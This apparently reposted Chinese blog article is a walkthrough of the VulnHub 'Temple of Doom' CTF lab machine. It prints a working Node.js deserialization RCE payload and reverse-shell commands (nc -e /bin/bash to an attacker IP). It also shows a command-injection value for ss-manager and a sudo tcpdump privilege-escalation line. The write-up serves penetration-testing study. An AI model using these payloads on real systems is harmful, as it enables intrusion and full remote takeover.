> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/CWKvhNRoRFLdLdvrI27FSA)

大余安全  

一个每日分享渗透小技巧的公众号![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPTQKiaXksbZia7PmHLPX2vnCWsznInTj3b9TFYtTDIYG6lDGJZYYSv72NsVWF24Kjlo4MT29tEOQSg/640?wx_fmt=png)

  

  

大家好，这里是 **大余安全** 的第 **29** 篇文章，本公众号会每日分享攻防渗透技术给大家。

![](https://mmbiz.qpic.cn/mmbiz_png/gBSJuVtWXPZE73MPxL1VoDjO3DFaxJA2MQpSSibwsXKVf4VIHh8S9fZXT8pq1ALE3hWEN22AaniaghxGrJqjEsxw/640?wx_fmt=png)

靶机地址：https://www.vulnhub.com/entry/temple-of-doom-1,243/

靶机难度：中级（CTF）

靶机发布日期：2018 年 6 月 8 日

靶机描述：

[+] 由 https://twitter.com/0katz 创建的 CTF

[+] 难度：简单 / 中级

[+] 在 VirtualBox 中测试

[+] 注意：2 种扎根方法！-- 来自谷歌翻译

目标：得到 root 权限 & 找到 flag.txt

请注意：对于所有这些计算机，我已经使用 VMware 运行下载的计算机。我将使用 Kali Linux 作为解决该 CTF 的攻击者机器。这里使用的技术仅用于学习教育目的，如果列出的技术用于其他任何目标，我概不负责。

![](https://mmbiz.qpic.cn/mmbiz_png/ymNhlIRQRwIDdqQDCiblECK9VN2KquqTzJXM7etEnDcIpDdITqzFuiapav9TDnIiaGgf1e4sP9IO6B5NEtEyg2t5w/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/eGDabDaNAhQ72wHWRToOUZR31X9kamiak0wrpr3lxKHpuoTpia329Xu6T0OTYlZic9XeEyQ4twasnibb924VBgIt1g/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/6DdW6admPmWicucEOicwONQBeMWRA7Pq57A9xCTGbIWomiboqObS0bEetoo2qW2hHk2E5GOcuQYUqSlQT5BKsDqRQ/640?wx_fmt=png)

一、信息收集

![](https://mmbiz.qpic.cn/mmbiz_png/M39rvicGKTibrmYlY2VW5XChia77yhteBC7iarNdYSwicq64NZrCHeSZqRpsFRTZkpfgclSWaibqftONNMWLkz6QjyoQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOePhs3TQdVSUm8UBtKvwPic9xnK74picHSWPdcuYNYE5AhWAXKDT3THOKj8u2c0NY6njbqmIQTF7icQ/640?wx_fmt=png)

我们在 VM 中需要确定攻击目标的 IP 地址，需要使用 nmap 获取目标 IP 地址：

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOePhs3TQdVSUm8UBtKvwPicAlFic0cKwM18yZ0kNeQurWD6WyemovZt6StjuJf7hsmSaAyHTscwAZw/640?wx_fmt=png)

我们已经找到了此次 CTF 目标计算机 IP 地址：192.168.56.126 （当然，第一张图就显示了 IP....）

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOePhs3TQdVSUm8UBtKvwPicjaIiax95y6W9VVCQMCiaxro9fTq5ue2dlasuu5hZlIEbqEibJI2UzUOuw/640?wx_fmt=png)

nmap 扫出开放了 22 和 666 端口...（有 Node.js）

22 先放着吧，没账号密码进不去的...666 是 http 服务，去看看....

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOePhs3TQdVSUm8UBtKvwPicjaIiax95y6W9VVCQMCiaxro9fTq5ue2dlasuu5hZlIEbqEibJI2UzUOuw/640?wx_fmt=png)

正在建设一个页面... 让我稍后再来... 等不急了爆破它

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOePhs3TQdVSUm8UBtKvwPicNMjfAKEreKraZ3ASIwSASxc4G0XUQwxS19dfRYs2ic03KK9eiaqkCCqw/640?wx_fmt=png)

竟然什么都没有.... 用 nikto 试试...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOePhs3TQdVSUm8UBtKvwPic6L3Dw9TKyhxTw96icJNsckW8BicwyUV7VibuQgPImzq1ZjJ4oNLiaLPUog/640?wx_fmt=png)

第一次使用 nikto 和 dirb 都扫不出一点信息....

这边我截取下他的会话 cookie 试试...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOePhs3TQdVSUm8UBtKvwPicDHlEibqPOKyuoQwL3CxF3eiaeRCskhlsiaQnQ61oLicsqwkwbgmm1CsPsw/640?wx_fmt=png)

发现服务器端响应中正在发送会话 cookie....

使用 Burp Decoder 对 Cookie 值进行解码....

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOePhs3TQdVSUm8UBtKvwPicQrthOPw6PkkDlN4HP1t7tSuXopFshpJxiciaqAty9BOfaywpnE3ZRfZw/640?wx_fmt=png)

第一次解码他会标记 %3 符号... 我选择 base64 继续进行解码，出现了：

```
u32t4o3tb3gg431fs34ggdgchjwnza0l=
```

看上面可以确定在会话 cookie 中传递了用户名 csrftoken 和 expires 参数...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOePhs3TQdVSUm8UBtKvwPicI6vnicshCvx91RfnRcmtK7shH06D3ydphRhXQM7TTunUaYmYKDkI0SQ/640?wx_fmt=png)

再次刷新后，返回了错误的提示...

发现 Web 服务正在使用 JSON，并且 Nmap 扫描中有 Node.js 框架，在谷歌上搜索

```
[exploit node.js](https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/)
```

看看...  

说存在反序列化漏洞利用... 我这边先测试下是否存在... 用反序列化函数试试...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOePhs3TQdVSUm8UBtKvwPicB6QDh6RiaKb3Fd3ictENltbMAsxPiaibLVZcbuVIOlk1rA9b99gkaI6qPg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOePhs3TQdVSUm8UBtKvwPicl2NibEibnPX9z8NgMAKric8xmkeGbeFIGYMvWYbRrPfrdFyYxpPpZFFWw/640?wx_fmt=png)

果然有反序列化漏洞存在...

```
[参考](https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/)
```

![](https://mmbiz.qpic.cn/mmbiz_png/6DdW6admPmWicucEOicwONQBeMWRA7Pq57A9xCTGbIWomiboqObS0bEetoo2qW2hHk2E5GOcuQYUqSlQT5BKsDqRQ/640?wx_fmt=png)

二、提权

![](https://mmbiz.qpic.cn/mmbiz_png/M39rvicGKTibrmYlY2VW5XChia77yhteBC7iarNdYSwicq64NZrCHeSZqRpsFRTZkpfgclSWaibqftONNMWLkz6QjyoQ/640?wx_fmt=png)

参考链接后，可以学习到怎么去提权...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOePhs3TQdVSUm8UBtKvwPicF4ouNyN6WibJaM1wibBZjmQLyxX5hqGvjNQWoIehqDNrpIjJ7Ovs2s5g/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOePhs3TQdVSUm8UBtKvwPic9Hk4vfFOhibPUgicJomDYwLg6cmGtibhic9FlC0LmpeMWjfTBiaUY4lchWw/640?wx_fmt=png)

```
{"username":"_ND_FUNC_function(){return require('child_process').execSync('whoami',(e,out,err)=>{console.log(out);}); }()"}
```

```
_  ND_FUNC  _ function（）：在本地执行一个函数
child_process是node.js中的一个模块，它以类似于popen（3）的方式生成子进程。
child_process.exec（）方法：此方法在控制台中运行命令并缓冲输出
（上面框架的命令可以套用...遇到反序列化漏洞，上面美元符号不能打...报错...)
它指定字符串Shell执行命令（在UNIX上默认：'/ bin / sh'）
```

制作的 Shell 可以知道 Linux 系统上的当前用户是谁，编码进行转发....

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOePhs3TQdVSUm8UBtKvwPicuzoqUhhOAFc9xH2ZVRdkhqKzLAibnxk87qCMlQfHxLwWeEhss7MJmsA/640?wx_fmt=png)

当前用户为 nodeadmin......

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOePhs3TQdVSUm8UBtKvwPicrkNvL2kasFkGEB7AguO2UR7nrN08uWcLsmA43hicliak4pEGxJp1QbIQ/640?wx_fmt=png)

我们执行 ls -lart 查找下目录底层信息看看...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOePhs3TQdVSUm8UBtKvwPic5SXofYGvXNbZwN8CmBX1lxaP9QWibzc3Cp7aFh0YKceXVnKtRRMgTtQ/640?wx_fmt=png)

这边直接创建 nc 对 / bin/bash 输入开启服务...（反向 netcat shell 命令）

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOePhs3TQdVSUm8UBtKvwPicotH98vmy6pzDDSkyzCx4r90bAv3sNcR2Oj6ic3nova1yuvdyncrvnuQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOePhs3TQdVSUm8UBtKvwPicTe2Uj3aXElHHeXlwdrT9gVWCxCRjKcjsiadXqEdOMk9JiaysmTPhQpGg/640?wx_fmt=png)

```
命令：{"username":"_$$ND_FUNC_function(){return require('child_process').execSync('nc -e /bin/bash 192.168.56.103 6666',(e,out,err)=>{console.log(out);}); }()"}
python -c 'import pty;pty.spawn("/bin/bash")'  （进入tty shell ）
```

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOePhs3TQdVSUm8UBtKvwPic0gXIwMVxspCtmWP88eGJpApiaVCRHYrpkT98x0Bxgkib1jEhAmrWuanw/640?wx_fmt=png)

没有权限进入 fireman 目录...

看看 fireman 是否有 root 权限去运行它...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOePhs3TQdVSUm8UBtKvwPic1YjrWk7rK9KL1Awgf11ibRkBZSGQxgBiauxa9lkMaUCGUxV5MOuAJVbQ/640?wx_fmt=png)

ss-manager 是作为根来运行的...ss-manager 容易受到远程代码执行的影响...

```
[参考](https://github.com/shadowsocks/shadowsocks-libev/issues/1734)
```

ss-manager 是 Shadowsocks 的缩写

Shadowsocks-libev 是用于嵌入式的服务和安全 SOCKS5 作为代理，ss-manager 用于控制多个用户的 shadowsocks 服务器，并在需要时生成新服务器... 就是能创建新服务去利用...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOePhs3TQdVSUm8UBtKvwPic9h7MkzAaiaD0F8M7VbBVS1libIYlZzw1u7NlZ3w2mwGsuF0H4PFZzAlw/640?wx_fmt=png)

创建服务器....

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOePhs3TQdVSUm8UBtKvwPicZI1WtOvnVzRq1xHUtbxxiazREbAtTceN2dIAVTgfH59IGT2fj3ZFNgg/640?wx_fmt=png)

```
add: {"server_port":8003, "password":"test", "method":"||nc -e /bin/sh 192.168.56.103 4444 ||"}
```

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOePhs3TQdVSUm8UBtKvwPicHiaGdZwnERx4XZa5NVgibwWMItwq4ZBWXlDaRcG5UN4q4NZNC9WicgC4A/640?wx_fmt=png)

进入 fireman 用户....

sudo -l 查看下有哪些可以提权的目录或者文件...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOePhs3TQdVSUm8UBtKvwPicXYUVNRHXKuyaEYXKjTfvYqTbUWOKqriaghia8Zho1c7s6ym0SRmW3sJg/640?wx_fmt=png)

存在 tcpdump，可以用于远程代码执行...

```
[参考](https://github.com/xapax/security/blob/master/privilege_escalation_-_linux.md)
```

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOePhs3TQdVSUm8UBtKvwPicLoVxfStyRRxfJUCOKguG6nxK6SW9Xf0icfQzYZicrhyvRtaHVQNLv7Mw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOePhs3TQdVSUm8UBtKvwPicUbtu7VmQicb44UPjrGAyQrrhIdQAPWpkCNV4c84g96Dqg7rQxnGcqbA/640?wx_fmt=png)

```
命令：echo "nc -e /bin/bash 192.168.56.103 1234" > dayu
命令：sudo tcpdump -ln -i eth0 -w /dev/null -W 1 -G 1 -z /tmp/dayu -Z root
```

将目录更改为 tmp，使用反向 netcat shell 创建了一个名为 dayu 的文件，将该文件的文件权限更改为 RWX，最后将 sudo 和 tcp dump 用于远程代码执行....

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOePhs3TQdVSUm8UBtKvwPicqiagJiaAJtib1PCfA5o3H3j18icIgJWTCB1e1J39j1Fo6ibaxSNwvnibicHXA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOePhs3TQdVSUm8UBtKvwPicOicqa4aP8qwialgVN4XcZgzYSpX7701icEL6ic7FYokkGqmXXq5NWkcoZw/640?wx_fmt=png)

成功获取 root 和 flag 文件... 介绍说有两种方法可以获取...

![](https://mmbiz.qpic.cn/mmbiz_png/gBSJuVtWXPZE73MPxL1VoDjO3DFaxJA2MQpSSibwsXKVf4VIHh8S9fZXT8pq1ALE3hWEN22AaniaghxGrJqjEsxw/640?wx_fmt=png)

这边我回想了下，一路过来都是 Node.js--ss-manager--tcpdump 这条路过来的....

因为只开了 22 和 666 端口，目前还没想到第二种方法能渗透的.... 如果有大神能想到... 请留言给我，感谢！！一起学习，一起加油！！！

由于我们已经成功得到 root 权限 & 找到 flag.txt，因此完成了简单靶机，希望你们喜欢这台机器，请继续关注大余后期会有更多具有挑战性的机器，一起练习学习。

如果你有其他的方法，欢迎留言。要是有写错了的地方，请你一定要告诉我。要是你觉得这篇博客写的还不错，欢迎分享给身边的人。

![](https://mmbiz.qpic.cn/mmbiz_png/ymNhlIRQRwIDdqQDCiblECK9VN2KquqTzJXM7etEnDcIpDdITqzFuiapav9TDnIiaGgf1e4sP9IO6B5NEtEyg2t5w/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/eGDabDaNAhQ72wHWRToOUZR31X9kamiak0wrpr3lxKHpuoTpia329Xu6T0OTYlZic9XeEyQ4twasnibb924VBgIt1g/640?wx_fmt=png)

如果觉得这篇文章对你有帮助，可以转发到朋友圈，谢谢小伙伴~

![](https://mmbiz.qpic.cn/mmbiz_png/c5xrRn4430AnqkfAJc38Vpnc5XiaADLTjiciciaibYU4EHw3Nuh7YMtuB0hz3sb8Em9iatt5skAsibuuysPLdLY5LtWOw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/p3lIbvldZiabdI5iaCb3icRhtygUuo2sp6Hcdq0ANlpy5W3gL628uq032jsoVnGnl6HdGrgDXjfazFtkp6IInibDdQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPqjaFWwyrrhiciahSpOibxqKvSIFX0iaPcG00CjYIwQDwIDeIicmFMlOVNyhWYVSE8pJK566UK3YOUNWQ/640?wx_fmt=png)

欢迎加入渗透学习交流群，想入群的小伙伴们加我微信，共同进步共同成长！

![](https://mmbiz.qpic.cn/mmbiz_png/ndicuTO22p6ibN1yF91ZicoggaJJZX3vQ77Vhx81O5GRyfuQoBRjpaUyLOErsSo8PwNYlT1XzZ6fbwQuXBRKf4j3Q/640?wx_fmt=png)  

大余安全

一个全栈渗透小技巧的公众号

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPTQKiaXksbZia7PmHLPX2vnCSsnsc7MHh257oYRic1MOT8qibABNUEnTq9DUL7QBwnS52EheJf4m8iaTQ/640?wx_fmt=png)